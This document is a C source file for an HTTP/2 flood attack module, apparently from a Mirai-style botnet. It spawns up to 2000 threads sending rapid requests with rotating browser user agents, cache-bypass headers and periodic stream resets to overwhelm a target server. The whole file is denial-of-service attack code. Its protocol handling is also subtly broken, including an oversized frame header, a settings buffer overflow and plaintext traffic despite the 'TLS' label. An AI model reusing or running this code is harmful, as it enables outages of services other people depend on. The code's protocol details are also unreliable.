#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#include <stdarg.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <signal.h>
#include <pthread.h>
#include <stdio.h>
#include <sys/resource.h>
// Remove OpenSSL includes - use raw sockets instead
// #include <openssl/ssl.h>
// #include <openssl/err.h>

#include "includes.h"
#include "attack.h"
#include "rand.h"
#include "util.h"
#include "table.h"

#define H2_TLS_BUFFER_SIZE 8192
#define H2_TLS_MAX_RETRIES 3
#define H2_TLS_CONNECTION_TIMEOUT 1
#define H2_TLS_REQUEST_TIMEOUT 1
#define H2_TLS_MAX_STREAMS 200
#define H2_TLS_MAX_CONCURRENT 2000

// HTTP/2 TLS specific constants
#define H2_TLS_PREFACE "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
#define H2_TLS_FRAME_HEADER_SIZE 9
#define H2_TLS_SETTINGS_FRAME 0x4
#define H2_TLS_HEADERS_FRAME 0x1
#define H2_TLS_DATA_FRAME 0x0
#define H2_TLS_PING_FRAME 0x6
#define H2_TLS_GOAWAY_FRAME 0x7
#define H2_TLS_RST_STREAM_FRAME 0x3

// HTTP/2 Frame Header Structure
struct h2_tls_frame_header {
    uint32_t length;
    uint8_t type;
    uint8_t flags;
    uint32_t stream_id;
} __attribute__((packed));

// HTTP/2 Settings Frame
struct h2_tls_settings_frame {
    uint16_t id;
    uint32_t value;
} __attribute__((packed));

// HTTP/2 RST Stream Frame
struct h2_tls_rst_stream_frame {
    uint32_t error_code;
} __attribute__((packed));

// Enhanced User Agents for HTTP/2 TLS
static const char *h2_tls_user_agents[] = {
    // Modern browsers with HTTP/2 support
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0"
};

// HTTP/2 specific headers for TLS
static const char *h2_tls_accept_headers[] = {
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
};

static const char *h2_tls_accept_encoding[] = {
    "gzip, deflate, br",
    "gzip, deflate",
    "br, gzip, deflate"
};

// Worker thread data structure
struct h2_tls_worker_data {
    struct attack_target *target;
    uint8_t opts_len;
    struct attack_option *opts;
    int thread_id;
    // Remove SSL_CTX dependency
    // SSL_CTX *ssl_ctx;
    int connection_count;
};

// HTTP/2 Frame creation functions
static void create_h2_tls_frame_header(uint8_t *buffer, uint32_t length, uint8_t type, uint8_t flags, uint32_t stream_id) {
    struct h2_tls_frame_header *header = (struct h2_tls_frame_header *)buffer;
    header->length = htonl(length);
    header->type = type;
    header->flags = flags;
    header->stream_id = htonl(stream_id);
}

static void create_h2_tls_settings_frame(uint8_t *buffer, uint16_t id, uint32_t value) {
    struct h2_tls_settings_frame *settings = (struct h2_tls_settings_frame *)buffer;
    settings->id = htons(id);
    settings->value = htonl(value);
}

static void create_h2_tls_rst_stream_frame(uint8_t *buffer, uint32_t error_code) {
    struct h2_tls_rst_stream_frame *rst = (struct h2_tls_rst_stream_frame *)buffer;
    rst->error_code = htonl(error_code);
}

// HTTP/2 TLS connection establishment with optimization using raw sockets
static int establish_h2_tls_connection(struct attack_target *target, struct attack_option *opts, uint8_t opts_len) {
    int sock = -1;
    
    // Create socket with high performance options
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) return -1;
    
    // Set socket options for maximum performance - use universal options
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    // Use conditional compilation for TCP options
    #ifdef TCP_NODELAY
        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt));
    #endif
    
    #ifdef TCP_QUICKACK
        setsockopt(sock, IPPROTO_TCP, TCP_QUICKACK, &opt, sizeof(opt));
    #endif
    
    // Set buffer sizes for high throughput
    int send_buf = 65536;
    int recv_buf = 65536;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &send_buf, sizeof(send_buf));
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &recv_buf, sizeof(recv_buf));
    
    // Set non-blocking
    fcntl(sock, F_SETFL, O_NONBLOCK);
    
    // Connect with timeout
    if (connect(sock, (struct sockaddr *)&target->sock_addr, sizeof(target->sock_addr)) == -1) {
        if (errno != EINPROGRESS) {
            close(sock);
            return -1;
        }
    }
    
    // Wait for connection with short timeout
    fd_set write_fds;
    struct timeval timeout;
    FD_ZERO(&write_fds);
    FD_SET(sock, &write_fds);
    timeout.tv_sec = H2_TLS_CONNECTION_TIMEOUT;
    timeout.tv_usec = 0;
    
    if (select(sock + 1, NULL, &write_fds, NULL, &timeout) <= 0) {
        close(sock);
        return -1;
    }
    
    // Send HTTP/2 preface immediately
    if (send(sock, H2_TLS_PREFACE, strlen(H2_TLS_PREFACE), 0) <= 0) {
        close(sock);
        return -1;
    }
    
    // Send optimized HTTP/2 settings frame
    uint8_t settings_frame[H2_TLS_FRAME_HEADER_SIZE + 18];
    create_h2_tls_frame_header(settings_frame, 18, H2_TLS_SETTINGS_FRAME, 0, 0);
    
    // Multiple settings for optimal performance
    create_h2_tls_settings_frame(settings_frame + H2_TLS_FRAME_HEADER_SIZE, 1, 65536);     // HEADER_TABLE_SIZE
    create_h2_tls_settings_frame(settings_frame + H2_TLS_FRAME_HEADER_SIZE + 6, 2, 1);     // ENABLE_PUSH
    create_h2_tls_settings_frame(settings_frame + H2_TLS_FRAME_HEADER_SIZE + 12, 3, 1000); // MAX_CONCURRENT_STREAMS
    create_h2_tls_settings_frame(settings_frame + H2_TLS_FRAME_HEADER_SIZE + 18, 4, 65536); // INITIAL_WINDOW_SIZE
    
    if (send(sock, settings_frame, sizeof(settings_frame), 0) <= 0) {
        close(sock);
        return -1;
    }
    
    return sock;
}

// HTTP/2 request sending with HPACK optimization
static int send_h2_tls_request(int sock, uint32_t stream_id, const char *method, const char *path, const char *host) {
    // Create optimized HTTP/2 headers frame
    uint8_t headers_frame[H2_TLS_FRAME_HEADER_SIZE + 2048];
    int offset = H2_TLS_FRAME_HEADER_SIZE;
    
    // HPACK encoded headers with static table optimization
    // :method (GET = index 2)
    headers_frame[offset++] = 0x82;
    
    // :path (root = index 4)
    headers_frame[offset++] = 0x84;
    
    // :scheme (https = index 7)
    headers_frame[offset++] = 0x87;
    
    // :authority (host = index 1)
    headers_frame[offset++] = 0x81;
    
    // User-Agent with literal header
    const char *user_agent = h2_tls_user_agents[rand() % (sizeof(h2_tls_user_agents) / sizeof(char *))];
    headers_frame[offset++] = 0x40; // Literal header name
    headers_frame[offset++] = strlen("user-agent");
    memcpy(headers_frame + offset, "user-agent", strlen("user-agent"));
    offset += strlen("user-agent");
    headers_frame[offset++] = 0x80; // Literal header value
    headers_frame[offset++] = strlen(user_agent);
    memcpy(headers_frame + offset, user_agent, strlen(user_agent));
    offset += strlen(user_agent);
    
    // Accept header
    const char *accept = h2_tls_accept_headers[rand() % (sizeof(h2_tls_accept_headers) / sizeof(char *))];
    headers_frame[offset++] = 0x40;
    headers_frame[offset++] = strlen("accept");
    memcpy(headers_frame + offset, "accept", strlen("accept"));
    offset += strlen("accept");
    headers_frame[offset++] = 0x80;
    headers_frame[offset++] = strlen(accept);
    memcpy(headers_frame + offset, accept, strlen(accept));
    offset += strlen(accept);
    
    // Accept-Encoding
    const char *accept_encoding = h2_tls_accept_encoding[rand() % (sizeof(h2_tls_accept_encoding) / sizeof(char *))];
    headers_frame[offset++] = 0x40;
    headers_frame[offset++] = strlen("accept-encoding");
    memcpy(headers_frame + offset, "accept-encoding", strlen("accept-encoding"));
    offset += strlen("accept-encoding");
    headers_frame[offset++] = 0x80;
    headers_frame[offset++] = strlen(accept_encoding);
    memcpy(headers_frame + offset, accept_encoding, strlen(accept_encoding));
    offset += strlen(accept_encoding);
    
    // Cache-Control for bypass
    headers_frame[offset++] = 0x40;
    headers_frame[offset++] = strlen("cache-control");
    memcpy(headers_frame + offset, "cache-control", strlen("cache-control"));
    offset += strlen("cache-control");
    headers_frame[offset++] = 0x80;
    headers_frame[offset++] = strlen("no-cache");
    memcpy(headers_frame + offset, "no-cache", strlen("no-cache"));
    offset += strlen("no-cache");
    
    // Create frame header
    create_h2_tls_frame_header(headers_frame, offset - H2_TLS_FRAME_HEADER_SIZE, H2_TLS_HEADERS_FRAME, 0x04, stream_id);
    
    // Send frame
    return send(sock, headers_frame, offset, 0);
}

// High-performance worker function
static void *h2_tls_worker(void *arg) {
    struct h2_tls_worker_data *worker_data = (struct h2_tls_worker_data *)arg;
    int sock = -1;
    
    // Establish connection
    sock = establish_h2_tls_connection(worker_data->target, worker_data->opts, worker_data->opts_len);
    if (sock == -1) {
        free(worker_data);
        return NULL;
    }
    
    // Send multiple requests on different streams for high RPS
    for (int i = 0; i < H2_TLS_MAX_STREAMS; i++) {
        uint32_t stream_id = (i * 2) + 1; // Odd stream IDs for client-initiated streams
        
        if (send_h2_tls_request(sock, stream_id, "GET", "/", "example.com") <= 0) {
            break;
        }
        
        // Minimal delay for maximum RPS
        usleep(100);
        
        // Occasionally send RST_STREAM to simulate real traffic
        if (i % 10 == 0 && i > 0) {
            uint8_t rst_frame[H2_TLS_FRAME_HEADER_SIZE + 4];
            create_h2_tls_frame_header(rst_frame, 4, H2_TLS_RST_STREAM_FRAME, 0, stream_id - 2);
            create_h2_tls_rst_stream_frame(rst_frame + H2_TLS_FRAME_HEADER_SIZE, 0); // NO_ERROR
            send(sock, rst_frame, sizeof(rst_frame), 0);
        }
    }
    
    // Cleanup
    close(sock);
    free(worker_data);
    return NULL;
}

// Main attack function with high performance
void attack_method_h2_tls(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts) {
    pthread_t thread_id;
    struct h2_tls_worker_data *worker_data;
    
    // Get connection count with high default
    int conns = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 500);
    
    // Limit connections for stability
    if (conns > H2_TLS_MAX_CONCURRENT) conns = H2_TLS_MAX_CONCURRENT;
    
    // Set thread priority for high performance
    setpriority(PRIO_PROCESS, 0, -10);
    
    // Create optimized worker threads
    for (int i = 0; i < conns; i++) {
        worker_data = malloc(sizeof(struct h2_tls_worker_data));
        worker_data->target = &targs[i % targs_len];
        worker_data->opts_len = opts_len;
        worker_data->opts = opts;
        worker_data->thread_id = i;
        worker_data->connection_count = 0;
        
        if (pthread_create(&thread_id, NULL, h2_tls_worker, worker_data) != 0) {
            free(worker_data);
            continue;
        }
        pthread_detach(thread_id);
        
        // Small delay between thread creation for stability
        usleep(100);
    }
}
